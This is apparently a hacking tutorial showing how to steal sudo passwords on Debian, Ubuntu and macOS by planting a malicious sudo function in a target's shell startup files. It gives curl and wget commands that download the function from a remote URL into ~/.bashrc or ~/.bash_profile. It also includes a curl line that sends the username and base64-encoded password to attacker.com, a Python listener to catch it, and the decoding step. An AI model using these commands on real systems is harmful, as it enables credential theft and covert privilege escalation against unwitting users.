# IN THIS TOTURIAL YOU WILL LEARN HOW Hackers Can Take Sudo Passwords from Linux & MacOS Computers ON SAME NETWORK 


How Sudo Is Supposed to Work
Let's use the following whoami and id commands as an example. If we enter whoami into a terminal, it will return the current username.

____________________________________________________________________________________________________________________________________________

~$ whoami

tokyoneon
____________________________________________________________________________________________________________________________________________

With the id command, it will return the user's uid (-u), a unique identifier assigned to each user on the system. By default, in Debian and Ubuntu systems, a normal user (non-root user) is assigned the uid of 1000 (shown below). Similarly, in macOS, a normal user is assigned the 501 uid.

____________________________________________________________________________________________________________________________________________

~$ id -u

1000
____________________________________________________________________________________________________________________________________________

When prepended, sudo elevates and executes the provided command with root (uid 0) privileges. This is all standard and normal behavior for sudo and Unix systems.

____________________________________________________________________________________________________________________________________________

~$ sudo id -u

0
____________________________________________________________________________________________________________________________________________

The type command can be used to identify how the supplied command is interpreted by the shell.

____________________________________________________________________________________________________________________________________________

~$ type sudo

sudo is /usr/bin/sudo
____________________________________________________________________________________________________________________________________________

In this case, sudo is interpreted as /usr/bin/sudo. This is also standard behavior. When someone executes the sudo command (e.g., sudo whoami), they're essentially doing the following.

____________________________________________________________________________________________________________________________________________

~$ /usr/bin/sudo /usr/bin/whoami

root
____________________________________________________________________________________________________________________________________________


## option 1 Target Debian & Ubuntu Systems

With Debian and Ubuntu systems, when a new terminal or shell is opened, the ~/.bashrc file is executed. This file (which can be modified by non-root users) usually defines useful attributes like aliases, history limit, and color variables. It can also be abused to import malicious Bash functions. This is true for Debian servers, Ubuntu desktops, and macOS systems.

For convenience, I've uploaded the malicious sudo function to my GitHub page. It can be downloaded onto the target's system using the below command.

____________________________________________________________________________________________________________________________________________

~$ curl 'https://git.io/fhNWm' >> ~/.bashrc
____________________________________________________________________________________________________________________________________________

This will append (>>) the sudo function to the bottom of the target's .bashrc file. From here on, when the target logs into their server (e.g., SSH) and executes a sudo command, the submitted password will be saved to the /tmp directory. Alternatively, if curl isn't installed on the target system, wget can be used.

____________________________________________________________________________________________________________________________________________

~$ wget -O- 'https://git.io/fhNWm' >> ~/.bashrc
____________________________________________________________________________________________________________________________________________


## Option 2  Target macOS Systems
This kind of attack is less effective against macOS users. Simply because they're not as likely to open a terminal and execute elevated commands. MacOS users don't need the sudo command as often as VPS targets or Ubuntu desktop users. Still, I'll show how to set this up against a macOS target as it might be helpful to some penetration testers exploring every possible route to elevate their backdoor.

Like the ~/.bashrc, macOS systems execute the ~/.bash__profile file when Terminal is opened. Malicious Bash functions can be stored in this file. Use the below wget command to import the function into the target's Bash profile.

____________________________________________________________________________________________________________________________________________

~$ wget -O- 'https://git.io/fhNWm' >> ~/.bash_profile
____________________________________________________________________________________________________________________________________________

When the target opens Terminal and executes a sudo command, the password will be stored in the /tmp directory. This is illustrated in the below screenshot.



# Step 2  Exfiltrate the Password (Optional)

In addition to saving the password to the /tmp directory, it might be desirable to have the password sent to another computer or server. A proper PHP listener could be set up to gracefully intercept POST data containing the password.

I decided to take a slightly unorthodox approach and feature a quick and dirty solution. This method requires a simple Python3 server set up on the attacker's Kali system. The http.server module (-m) will create a web server using port 80.

____________________________________________________________________________________________________________________________________________

~$ python3 -m http.server 80

Serving HTTP on 0.0.0.0 port 80 ...

__________________________________________________________________________________________________________________________________________

There are commands for encoding and exfiltrating passwords written into the sudo function(https://gist.github.com/tokyoneon/34ce1c9e1530a12eb392b1eab09fcbac#file-sudo). It's disabled by default and needs to be uncommented to enable it.

____________________________________________________________________________________________________________________________________________

encoded=$(printf '%s' "$inputPasswd" | base64) > /dev/null 2>&1;
curl -s "http://attacker.com/$USER:$encoded" > /dev/null 2>&1;___________________________________________________________________________________________________________________________________________


The password is encoded with base64 to make it easier to send in the URL. Curl is used to silently (-s) make a GET request on the attacker's server located at the "attacker.com" domain. This domain should be changed to the attacker's local IP address (192.168.1.X) or VPS IP address. Errors and output generated by the curl command are forced into /dev/null with the 2>&1 redirect. This prevents curl from accidentally reporting errors in the terminal if the attacker's server is for some reason inaccessible.

The target's username and password are actually sent in the URL. Imagine making a request to "http://192.168.1.X/tokyoneon:sUp3R-S3cUre_P@$$w0000rD!." The request would surely fail, there's no such webpage. However, the encoded password would be stored in the attacker's error log. Below is an example of such an error.

____________________________________________________________________________________________________________________________________________

Serving HTTP on 0.0.0.0 port 80 ...
127.0.0.1 - - [27/Feb/2019 00:05:12] code 404, message File not found
127.0.0.1 - - [27/Feb/2019 00:05:12] "GET /user:c1VwM1ItUzNjVXJlX1BAJCR3MDAwMHJEIQ== HTTP/1.1" 404 -
____________________________________________________________________________________________________________________________________________


### Simply echo the encoded password into base64 to decode (-d) it.

____________________________________________________________________________________________________________________________________________

~$ echo 'c1VwM1ItUzNjVXJlX1BAJCR3MDAwMHJEIQ==' | base64 -d

sUp3R-S3cUre_P@$$w0000rD!

____________________________________________________________________________________________________________________________________________











____________________________________________________________________________________________________________________________________________
▶ Name: StromWise

▶ Role: Creator

▶ Location: Unknown

▶ GitHub: https://github.com/stromwise 

▶ Instagram: https://www.instagram.com/stromwise/ 

▶ Facebook: https://www.facebook.com/profile.php?id=100093706328777

▶ Youtube: https://www.youtube.com/channel/UC-tafc0TqgZNnQio8Gj-hjg 

▶ Twitter: https://twitter.com/StromWise 
____________________________________________________________________________________________________________________________________________

